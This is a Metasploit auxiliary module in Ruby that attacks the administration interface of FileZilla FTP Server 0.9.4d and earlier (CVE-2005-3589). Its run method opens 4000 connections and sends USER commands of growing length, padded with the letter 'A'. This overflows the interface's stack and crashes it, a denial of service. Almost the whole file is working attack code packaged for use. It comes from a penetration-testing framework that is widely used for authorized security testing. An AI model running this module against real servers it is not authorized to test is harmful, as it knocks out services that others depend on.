##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'FileZilla FTP Server Admin Interface Denial of Service',
      'Description'	=> %q{
        This module triggers a Denial of Service condition in the FileZilla FTP
        Server Administration Interface in versions 0.9.4d and earlier.
        By sending a procession of excessively long USER commands to the FTP
        Server, the Administration Interface (FileZilla Server Interface.exe)
        when running, will overwrite the stack with our string and generate an
        exception. The FileZilla FTP Server itself will continue functioning.
      },
      'Author' 		=> [ 'patrick' ],
      'License'        	=> MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '15346' ],
          [ 'CVE', '2005-3589' ],
          [ 'EDB', '1336' ],
          [ 'OSVDB', '20817' ]
        ],
      'DisclosureDate' => 'Nov 07 2005'))
  end

  def run
    print_status("Sending 4000 packets, this may take a while.")

    4000.times do |x|
      connect
      sock.put("USER #{"A" * x}\r\n")
      disconnect
    end
  end

end
